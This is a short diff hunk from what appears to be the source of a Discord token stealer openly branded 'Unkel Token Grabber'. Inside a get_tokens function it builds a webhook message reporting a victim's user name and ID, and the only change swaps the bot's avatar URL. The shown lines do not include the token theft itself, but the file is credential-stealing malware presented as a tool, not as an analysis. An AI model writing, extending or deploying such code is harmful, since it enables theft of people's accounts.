@@ -124,7 +124,7 @@ def get_tokens():
                         
                         embed = {
                             "username": "Unkel Token Grabber - Made by Unkel",
-                            "avatar_url": "https://cdn.discordapp.com/avatars/1054682856414269513/95ea588f83bfc7d8df765153a6e0226e.png?size=1024",
+                            "avatar_url": "https://cdn.discordapp.com/avatars/1222198787506962472/a393dd82febdb5127de0e1c47d1aa9c3.png?size=1024",
                             "content": f"**{user_name}** *({user_id})*",
                             "embeds": [
                                 {
